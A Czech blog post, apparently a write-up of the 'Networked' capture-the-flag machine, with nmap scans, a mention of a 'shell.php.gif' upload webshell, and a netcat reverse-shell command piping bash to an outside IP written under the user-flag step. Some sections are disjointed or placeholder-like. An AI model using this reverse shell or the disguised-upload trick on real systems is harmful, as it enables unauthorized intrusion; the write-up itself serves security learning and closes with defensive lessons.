---
layout: post
author: Tomáš Matějíček
title: "Networked"
date: 2020-12-20
tags: ssh sudo php exploit enumeration privesc
---
## Úvod a kontext

Networked stojí na řetězení několika konkrétních slabin a artefaktů: webová aplikace v PHP, Apache a SSH.

Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká reverse shell přes webovou vrstvu a teprve na něj navazuje lokální enumeraci po získání shellu.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
ca
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```
```
PORT      STATE         SERVICE
684/udp   open|filtered corba-iiop-ssl
776/udp   open|filtered wpages
838/udp   open|filtered unknown
1101/udp  open|filtered pt2-discover
2002/udp  open|filtered globe
2161/udp  open|filtered apc-2161
5353/udp  open|filtered zeroconf
9950/udp  open|filtered apc-9950
16548/udp open|filtered unknown
16697/udp open|filtered unknown
17629/udp open|filtered unknown
17754/udp open|filtered zep
19718/udp open|filtered unknown
20522/udp open|filtered unknown
21212/udp open|filtered unknown
21320/udp open|filtered unknown
21663/udp open|filtered unknown
25280/udp open|filtered unknown
25375/udp open|filtered unknown
27195/udp open|filtered unknown
28465/udp open|filtered unknown
31681/udp open|filtered unknown
32798/udp open|filtered unknown
38412/udp open|filtered unknown
40724/udp open|filtered unknown
40732/udp open|filtered unknown
42577/udp open|filtered unknown
44160/udp open|filtered unknown
47981/udp open|filtered unknown
49188/udp open|filtered unknown
49220/udp open|filtered unknown
61319/udp open|filtered unknown
```

## Analýza zjištění

### Přílohy

![Networked-shell.php.gif](/assets/images/posts/Networked/Networked-shell.php.gif)

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
22 OpenSSH 7.4 (protocol 2.0)
```
```
- Ověřit enumeraci SSH uživatelů
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat /home/guly/user.txt
```
```
__CENSORED__
netcat -lvp 4002
echo nc 10.10.15.13 4002 -c bash > /tmp/shell
chmod +x /tmp/shell
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako webová aplikace v PHP, Apache a SSH.
- User část stála na ověřeném kroku typu reverse shell přes webovou vrstvu, ne na odhadu bez technického potvrzení.
- Závěrečná eskalace pak stála na tom, co představuje lokální enumerace po získání shellu, takže rozhodující byla práce s lokálním kontextem po footholdu.

## Co si odnést do praxe

- Upload obrázků a podobných souborů musí být důsledně oddělený od jejich server-side vykonání; právě `shell.php.gif` ukazuje, jak málo stačí k webshellu.
- Jednorázový foothold přes web je potřeba rychle převést na stabilnější přístup, ale zároveň detekovat neobvyklé binárky a reverse shelly v adresářích jako `/tmp`.
- Lokální úlohy spouštěné pod účtem `guly` nesmějí důvěřovat zapisovatelnému obsahu z dočasných cest, jinak z nich vzniká přímý privesc kanál.
